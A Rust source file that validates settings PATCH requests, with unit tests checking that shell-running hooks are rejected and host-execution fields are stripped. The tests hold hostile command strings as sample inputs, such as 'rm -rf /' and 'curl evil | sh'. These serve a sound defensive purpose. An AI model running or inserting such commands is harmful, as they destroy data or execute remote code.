//! Server-side settings PATCH policy derived from the schema: unknown fields,
//! elevation, `local_only` stripping, and value validation. Sections without a
//! schema (such as `hooks`, which runs shell commands) are unknown and unreachable.

use serde_json::Value;

use super::{schema, validate_value, FieldDescriptor, WebWritePolicy};

/// Only the profile endpoint accepts the top-level `description` string.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Scope {
    Global,
    Profile,
}

#[derive(Debug, Clone, PartialEq)]
pub enum PatchRejection {
    UnknownSection(String),
    UnknownField(String),
    GlobalOnly(String),
    Malformed(String),
    /// 403; every other rejection is 400.
    NeedsElevation {
        path: String,
        reason: String,
    },
    Invalid {
        path: String,
        reason: String,
    },
}

impl PatchRejection {
    pub fn status_code(&self) -> u16 {
        match self {
            PatchRejection::NeedsElevation { .. } => 403,
            _ => 400,
        }
    }

    /// `elevation_required` triggers the web client's passphrase prompt.
    pub fn error_code(&self) -> &'static str {
        match self {
            PatchRejection::NeedsElevation { .. } => "elevation_required",
            _ => "validation_failed",
        }
    }

    pub fn message(&self) -> String {
        match self {
            PatchRejection::UnknownSection(s) => {
                format!("Settings section '{s}' is not allowed via the web API.")
            }
            PatchRejection::UnknownField(p) => {
                format!("Settings field '{p}' is not a known setting.")
            }
            PatchRejection::GlobalOnly(p) => {
                format!("Settings field '{p}' is global-only; use PATCH /api/settings.")
            }
            PatchRejection::Malformed(s) => {
                format!("Settings section '{s}' has a malformed value.")
            }
            PatchRejection::NeedsElevation { .. } => "Re-enter the passphrase to continue".into(),
            PatchRejection::Invalid { path, reason } => {
                format!("Field '{path}' is invalid: {reason}")
            }
        }
    }
}

fn lookup_in<'a>(
    descriptors: &'a [FieldDescriptor],
    section: &str,
    field: &str,
) -> Option<&'a FieldDescriptor> {
    descriptors
        .iter()
        .find(|d| d.section == section && d.field == field)
}

/// Drops `local_only` leaves in place so an echoed-back patch keeps its safe
/// edits. Unknown fields are left for `validate_patch` to reject.
pub fn strip_local_only(patch: &mut Value) {
    let Some(obj) = patch.as_object_mut() else {
        return;
    };
    let descriptors = schema();
    for (section, value) in obj.iter_mut() {
        let Some(fields) = value.as_object_mut() else {
            continue;
        };
        fields.retain(|field, _| {
            !matches!(
                lookup_in(&descriptors, section, field).map(|d| &d.web_write),
                Some(WebWritePolicy::LocalOnly { .. })
            )
        });
    }
}

/// Returns the first rejection. A `null` leaf clears an override and skips value
/// validation. Call [`strip_local_only`] before saving; `local_only` is not checked here.
pub fn validate_patch(patch: &Value, scope: Scope, elevated: bool) -> Result<(), PatchRejection> {
    validate_patch_with(&schema(), patch, scope, elevated)
}

/// [`validate_patch`] against the runtime schema, including plugin sections.
pub fn validate_patch_with(
    descriptors: &[FieldDescriptor],
    patch: &Value,
    scope: Scope,
    elevated: bool,
) -> Result<(), PatchRejection> {
    let Some(obj) = patch.as_object() else {
        return Err(PatchRejection::Malformed("<root>".into()));
    };
    for (section, value) in obj {
        if section == "description" {
            if scope == Scope::Profile && value.is_string() {
                continue;
            }
            return Err(PatchRejection::UnknownSection(section.clone()));
        }
        if !descriptors.iter().any(|d| d.section == *section) {
            return Err(PatchRejection::UnknownSection(section.clone()));
        }
        let Some(fields) = value.as_object() else {
            return Err(PatchRejection::Malformed(section.clone()));
        };
        for (field, val) in fields {
            let path = format!("{section}.{field}");
            let Some(d) = lookup_in(descriptors, section, field) else {
                return Err(PatchRejection::UnknownField(path));
            };
            if scope == Scope::Profile && !d.profile_overridable {
                return Err(PatchRejection::GlobalOnly(path));
            }
            if let WebWritePolicy::RequiresElevation { reason } = &d.web_write {
                if !elevated {
                    return Err(PatchRejection::NeedsElevation {
                        path,
                        reason: reason.clone(),
                    });
                }
            }
            if val.is_null() {
                continue;
            }
            if let Err(e) = validate_value(&d.validation, val) {
                return Err(PatchRejection::Invalid {
                    path,
                    reason: e.reason,
                });
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    /// Every shape `validate_patch` refuses, and the rejection each returns.
    #[test]
    fn validate_patch_rejects_unknown_malformed_and_invalid_shapes() {
        let err = validate_patch(&json!({"nope": {"x": 1}}), Scope::Global, true).unwrap_err();
        assert!(matches!(err, PatchRejection::UnknownSection(_)));
        assert_eq!(err.status_code(), 400);

        // `hooks` runs shell commands and bypasses repo trust, so it is not a
        // known section on either scope.
        for scope in [Scope::Global, Scope::Profile] {
            let err = validate_patch(&json!({"hooks": {"on_start": "rm -rf /"}}), scope, true)
                .unwrap_err();
            assert!(
                matches!(err, PatchRejection::UnknownSection(ref s) if s == "hooks"),
                "{scope:?}"
            );
        }

        let err = validate_patch(&json!({"session": {"made_up": true}}), Scope::Global, true)
            .unwrap_err();
        assert!(matches!(err, PatchRejection::UnknownField(ref p) if p == "session.made_up"));

        let err =
            validate_patch(&json!({"theme": "not-an-object"}), Scope::Global, true).unwrap_err();
        assert!(matches!(err, PatchRejection::Malformed(_)));

        let err = validate_patch(
            &json!({"acp": {"default_agent": "  "}}),
            Scope::Global,
            true,
        )
        .unwrap_err();
        assert!(matches!(err, PatchRejection::Invalid { .. }));
        assert_eq!(err.status_code(), 400);

        // A null leaf clears the field, so it skips validation.
        assert!(validate_patch(
            &json!({"acp": {"default_agent": null}}),
            Scope::Profile,
            true
        )
        .is_ok());

        // `description` exists on a profile only.
        assert!(validate_patch(&json!({"description": "x"}), Scope::Profile, true).is_ok());
        let err = validate_patch(&json!({"description": "x"}), Scope::Global, true).unwrap_err();
        assert!(matches!(err, PatchRejection::UnknownSection(ref s) if s == "description"));
    }

    /// `strip_local_only` drops the host-execution surfaces (agent commands,
    /// status-hook command lines, the ACP node path) and leaves the rest of the
    /// same section intact, so what survives still validates.
    #[test]
    fn strip_local_only_removes_host_execution_surfaces() {
        for field in [
            "agent_command_override",
            "agent_extra_args",
            "custom_agents",
            "agent_detect_as",
            "agent_acp_cmd",
            "agent_config_dir",
        ] {
            let mut body = json!({"session": {field: {"claude": "x"}, "yolo_mode_default": true}});
            strip_local_only(&mut body);
            assert!(body["session"].get(field).is_none(), "session.{field}");
            assert_eq!(body["session"]["yolo_mode_default"], json!(true));
            assert!(validate_patch(&body, Scope::Profile, true).is_ok());
        }

        let mut body = json!({"status_hooks": {
            "on_running": "curl evil | sh",
            "on_idle": "x",
            "on_change": "y",
            "enabled": true,
        }});
        strip_local_only(&mut body);
        for field in ["on_running", "on_idle", "on_change"] {
            assert!(body["status_hooks"].get(field).is_none(), "{field}");
        }
        assert_eq!(body["status_hooks"]["enabled"], json!(true));
        assert!(validate_patch(&body, Scope::Profile, true).is_ok());

        let mut body = json!({"acp": {"show_tool_durations": true, "node_path": "/tmp/evil-node"}});
        strip_local_only(&mut body);
        assert!(body["acp"].get("node_path").is_none());
        assert_eq!(body["acp"]["show_tool_durations"], json!(true));
        assert!(validate_patch(&body, Scope::Profile, true).is_ok());
    }

    #[test]
    fn sandbox_and_worktree_require_elevation() {
        for body in [
            json!({"sandbox": {"default_image": "alpine"}}),
            json!({"worktree": {"path_template": "{repo}-{branch}"}}),
        ] {
            let err = validate_patch(&body, Scope::Profile, false).unwrap_err();
            assert!(
                matches!(err, PatchRejection::NeedsElevation { .. }),
                "{body} should need elevation, got {err:?}"
            );
            assert_eq!(err.error_code(), "elevation_required");
            assert!(validate_patch(&body, Scope::Profile, true).is_ok());
        }
    }

    #[test]
    fn safe_sections_need_no_elevation() {
        // #1510: safe fields save without a passphrase re-prompt.
        for body in [
            json!({"theme": {"idle_decay_minutes": 5}}),
            json!({"updates": {"update_check_mode": "notify"}}),
            json!({"session": {"yolo_mode_default": true, "strict_hotkeys": false}}),
            json!({"description": "my profile"}),
        ] {
            assert!(
                validate_patch(&body, Scope::Profile, false).is_ok(),
                "{body} should validate unelevated"
            );
        }
    }

    #[test]
    fn profile_scope_rejects_global_only_fields_including_resets() {
        for field in schema().iter().filter(|field| !field.profile_overridable) {
            let body = json!({&field.section: {&field.field: null}});
            let err = validate_patch(&body, Scope::Profile, true).unwrap_err();
            assert_eq!(err, PatchRejection::GlobalOnly(field.path()));
            assert_eq!(err.status_code(), 400);
            assert!(validate_patch(&body, Scope::Global, true).is_ok());
        }
    }
}
